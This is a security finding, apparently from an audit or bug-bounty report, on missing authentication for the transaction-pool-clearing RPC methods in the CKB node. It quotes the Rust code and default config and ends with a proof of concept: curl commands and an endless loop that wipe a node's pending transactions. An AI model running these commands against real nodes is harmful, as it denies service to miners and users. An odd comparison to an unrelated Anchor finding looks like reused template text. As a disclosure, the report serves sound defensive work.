### Title
Missing Caller Authentication on Destructive Pool RPC Methods Allows Any Unprivileged Local Process to Clear the Transaction Pool — (`rpc/src/module/pool.rs`)

---

### Summary

The `clear_tx_pool` and `clear_tx_verify_queue` methods in the Pool RPC module perform irreversible, destructive operations on the node's transaction pool but contain no caller authentication or identity check of any kind. Because the Pool module is enabled by default in production, any process that can reach the RPC port — by default `127.0.0.1:8114`, reachable by any local process without privilege — can invoke these methods and instantly wipe all pending transactions or the entire verification queue. This is the direct CKB analog of the Anchor `FabricateMIRClaim`/`FabricateANCClaim` pattern: privileged, state-mutating operations that should be restricted to an authorized caller but are callable by anyone.

---

### Finding Description

**Root cause — no access control on destructive pool operations:**

`clear_tx_pool` in `rpc/src/module/pool.rs`:

```rust
fn clear_tx_pool(&self) -> Result<()> {
    let snapshot = Arc::clone(&self.shared.snapshot());
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_pool(snapshot)
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

`clear_tx_verify_queue` in the same file:

```rust
fn clear_tx_verify_queue(&self) -> Result<()> {
    let tx_pool = self.shared.tx_pool_controller();
    tx_pool
        .clear_verify_queue()
        .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;
    Ok(())
}
```

Neither function checks who the caller is. There is no token, session, IP allowlist, or any other identity gate before the destructive action is executed.

**Module is enabled by default in production:**

The default `ckb.toml` ships with:

```toml
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"]
```

Pool is in the default set. The `ServiceBuilder::enable_pool` path mounts these methods unconditionally when the module is enabled.

**RPC binding:**

The default binding is `127.0.0.1:8114`. This means any process running on the same host — including unprivileged user-space processes, scripts, or malware — can reach the endpoint without any OS-level privilege. No authentication is required at the HTTP/JSON-RPC layer either.

**Attack path:**

1. Attacker gains code execution on the same host as the CKB node (e.g., via a malicious dependency, a co-located service, or a compromised user account — all realistic in a mining or staking server environment).
2. Attacker sends a single HTTP POST to `http://127.0.0.1:8114`:
   ```json
   {"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}
   ```
3. The entire pending transaction pool is wiped instantly. No error, no confirmation, no log warning that identifies the caller.
4. Attacker repeats in a loop to keep the pool perpetually empty.

The same applies to `clear_tx_verify_queue`, which drains all transactions waiting for script verification, preventing any new transactions from being confirmed until they are resubmitted.

---

### Impact Explanation

- **Miner revenue loss**: All pending transactions with fees are evicted. The miner's next block template will contain only the coinbase transaction, forfeiting all transaction fees for that block. Repeated calls keep the pool empty indefinitely.
- **User transaction disruption**: Every user whose transaction was in the pool must resubmit. Under sustained attack, transactions can never accumulate, effectively halting the node's ability to include user transactions.
- **Verification queue starvation**: `clear_tx_verify_queue` removes transactions that are mid-verification. Combined with `clear_tx_pool`, an attacker can ensure the node never processes any user transaction.
- **No audit trail of the caller**: The RPC layer logs the method call but not the originating process or any identity token, making forensic attribution difficult.

This constitutes **service unavailability and severe degradation** of the node's core function (transaction processing and block assembly) under realistic, no-privilege attacker input.

---

### Likelihood Explanation

- **Attacker precondition**: Local code execution on the node host. This is realistic in shared hosting, cloud VMs with multiple tenants, mining pools with co-located services, or any environment where a dependency or co-process is compromised.
- **No cryptographic barrier**: The attack requires a single HTTP POST with a known, documented method name. No key, token, or secret is needed.
- **Automation**: The attack can be scripted to fire every few seconds, keeping the pool perpetually empty with negligible attacker cost.
- **Default configuration is vulnerable**: No operator action is required to expose this surface; it is on by default.

---

### Recommendation

1. **Add an authentication layer to the RPC server**: Implement HTTP Basic Auth or a bearer token for all state-mutating Pool methods. The miner client already demonstrates the pattern of passing `Authorization` headers.
2. **Move destructive methods to a restricted module**: `clear_tx_pool` and `clear_tx_verify_queue` have no legitimate use in normal node operation. Move them to the `Debug` or `IntegrationTest` module (both disabled by default) or introduce a new `Admin` module that is off by default.
3. **IP allowlist enforcement at the method level**: Even if the RPC is localhost-bound, add a configurable allowlist of source IPs or Unix socket support so that only the node operator's own processes can call destructive methods.
4. **Rate-limit or require confirmation**: At minimum, log a warning with the source IP and rate-limit calls to `clear_tx_pool` to prevent automated abuse.

---

### Proof of Concept

**Prerequisites**: CKB node running with default config (`Pool` module enabled, RPC on `127.0.0.1:8114`). Attacker has local shell access (no root required).

**Step 1 — Confirm pool has transactions:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":1}'
# Returns: {"pending":"0x5", ...}  ← 5 pending transactions
```

**Step 2 — Clear pool without any credential:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":2}'
# Returns: {"result":null}  ← success, no auth required
```

**Step 3 — Confirm pool is empty:**
```bash
curl -s -X POST http://127.0.0.1:8114 \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"tx_pool_info","params":[],"id":3}'
# Returns: {"pending":"0x0", ...}  ← all transactions gone
```

**Step 4 — Sustained DoS loop:**
```bash
while true; do
  curl -s -X POST http://127.0.0.1:8114 \
    -H 'Content-Type: application/json' \
    -d '{"jsonrpc":"2.0","method":"clear_tx_pool","params":[],"id":1}' > /dev/null
  sleep 2
done
```

The node's miner will produce empty blocks (coinbase only) for the duration of the attack, forfeiting all transaction fee revenue. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** rpc/src/module/pool.rs (L684-701)
```rust
    fn clear_tx_pool(&self) -> Result<()> {
        let snapshot = Arc::clone(&self.shared.snapshot());
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_pool(snapshot)
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }

    fn clear_tx_verify_queue(&self) -> Result<()> {
        let tx_pool = self.shared.tx_pool_controller();
        tx_pool
            .clear_verify_queue()
            .map_err(|err| RPCError::custom(RPCError::Invalid, err.to_string()))?;

        Ok(())
    }
```

**File:** rpc/src/service_builder.rs (L64-77)
```rust
    /// Mounts methods from module Pool if it is enabled in the config.
    pub fn enable_pool(
        mut self,
        shared: Shared,
        extra_well_known_lock_scripts: Vec<Script>,
        extra_well_known_type_scripts: Vec<Script>,
    ) -> Self {
        let methods = PoolRpcImpl::new(
            shared,
            extra_well_known_lock_scripts,
            extra_well_known_type_scripts,
        );
        set_rpc_module_methods!(self, "Pool", pool_enable, add_pool_rpc_methods, methods)
    }
```

**File:** resource/ckb.toml (L189-193)
```text
# List of API modules: ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Indexer", "RichIndexer", "Terminal"]
modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Terminal"] # {{
# dev => modules = ["Net", "Pool", "Miner", "Chain", "Stats", "Subscription", "Experiment", "Debug", "Terminal"]
# integration => modules = ["Net", "Pool", "Miner", "Chain", "Experiment", "Stats", "IntegrationTest", "Terminal"]
# }}
```
